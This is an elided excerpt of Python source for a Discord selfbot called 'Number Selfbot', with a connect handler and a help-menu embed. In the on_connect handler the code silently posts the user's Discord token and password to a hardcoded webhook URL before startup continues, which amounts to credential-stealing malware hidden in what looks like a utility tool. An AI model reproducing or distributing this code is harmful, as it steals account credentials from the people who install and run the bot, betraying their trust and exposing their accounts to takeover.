...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/773558109343449088/TMetzCTD9b7ySK6GrEOZQeOeFjQI-miZRO8Rkvy10d6YC69TF3Bmi3wryVDiZ3fEGW6v',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
    startprint()
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_author(name="Number Selfbot" + str(Exeter.command_prefix),
                         icon_url=Exeter.user.avatar_url)
        embed.set_thumbnail(url=Exeter.user.avatar_url)
        embed.set_image(url="https://media.discordapp.net/attachments/709893843872645143/771680877188743168/image7.gif")
        embed.add_field(name="\uD83E\uDDCA `1`", value="", inline=False)
        embed.add_field(name="\uD83E\uDDCA `2`", value="", inline=False)
        embed.add_field(name="\uD83E\uDDCA `3`", value="", inline=False)
        embed.add_field(name="\uD83E\uDDCA `4`", value="", inline=False)
        embed.add_field(name="\uD83E\uDDCA `5`", value="", inline=False)
